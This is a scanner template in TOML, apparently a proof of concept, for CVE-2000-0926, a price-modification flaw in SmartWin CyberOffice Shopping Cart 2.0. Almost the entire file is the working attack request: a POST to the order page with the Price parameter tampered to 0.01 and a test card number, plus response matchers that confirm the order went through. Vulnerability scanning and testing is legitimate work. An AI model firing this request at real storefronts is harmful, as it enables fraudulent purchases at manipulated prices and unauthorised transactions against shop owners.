[info]
author = "AVE"
description = "检测 SmartWin CyberOffice Shopping Cart 2.0 是否存在价格修改漏洞。通过向订单处理页面提交篡改后的 Price 参数，验证服务端是否对价格参数进行校验。"
id = "POC-AVE-2000-0679"
name = "SmartWin CyberOffice Shopping Cart 2.0 Price Modification PoC"
severity = "high"
tags = ["ave-2000-0679"]
vuln_id = [
    "CVE-2000-0926",
    "AVE-2000-0679",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/shop/order.asp"
protocol = "http"

[poc.requests.body]
content = "ProductID=1&Quantity=1&Price=0.01&Name=test&Address=test&CCNumber=4111111111111111"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "order",
    "thank you",
    "confirmation",
    "success",
]
